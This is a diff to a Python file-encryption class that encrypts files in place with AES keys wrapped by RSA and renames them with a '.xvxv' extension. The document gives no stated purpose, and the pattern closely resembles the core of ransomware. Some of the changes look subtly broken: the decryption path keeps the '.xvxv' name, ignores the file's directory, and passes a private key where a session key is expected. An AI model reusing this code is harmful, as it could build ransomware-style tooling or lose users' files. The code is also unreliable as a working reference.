@@ -35,13 +35,17 @@ class Encryptor:
         return get_random_bytes(32)  # 256-bit AES key
 
     def encrypt_file(self, input_file, output_file, session_key):
+        # Extract the original file name and extension
+        filename, file_extension = os.path.splitext(input_file)
+        encrypted_file = f"{filename}{file_extension}.xvxv"
+
         # Generate a random initialization vector (IV) for AES
         iv = get_random_bytes(16)
 
         # Create an AES cipher with the session key and IV
         cipher = AES.new(session_key, AES.MODE_CFB, iv)
 
-        with open(input_file, 'rb') as infile, open(output_file, 'wb') as outfile:
+        with open(input_file, 'rb') as infile, open(encrypted_file, 'wb') as outfile:
             outfile.write(iv)  # Write the IV to the output file
             while True:
                 chunk = infile.read(8192)
@@ -66,12 +70,8 @@ class Encryptor:
                 session_key = self.generate_aes_key()
                 encrypted_session_key = PKCS1_OAEP.new(public_key).encrypt(session_key)
 
-                # Use a temporary file to store the encrypted content
-                with tempfile.NamedTemporaryFile(delete=False) as temp_file:
-                    self.encrypt_file(input_file_path, temp_file.name, session_key)
+                self.encrypt_file(input_file_path, input_file_path, session_key)
 
-                # Replace the original file with the temporary file
-                shutil.move(temp_file.name, input_file_path)
                 print(f"Encrypted {file_name} successfully.")
 
     def decrypt_file(self, input_file, output_file, session_key):
@@ -101,6 +101,11 @@ class Encryptor:
                     with tempfile.NamedTemporaryFile(delete=False) as temp_file:
                         self.decrypt_file(input_file_path, temp_file.name, private_key)
 
+                    # Extract the original file name and extension
+                    filename, file_extension = os.path.splitext(file_name)
+                    original_file_path = f"{filename}{file_extension}"
+
                     # Replace the original file with the temporary file
-                    shutil.move(temp_file.name, input_file_path)
+                    shutil.move(temp_file.name, original_file_path)
+                    os.remove(input_file_path)
                     print(f"Decrypted {file_name} successfully.")
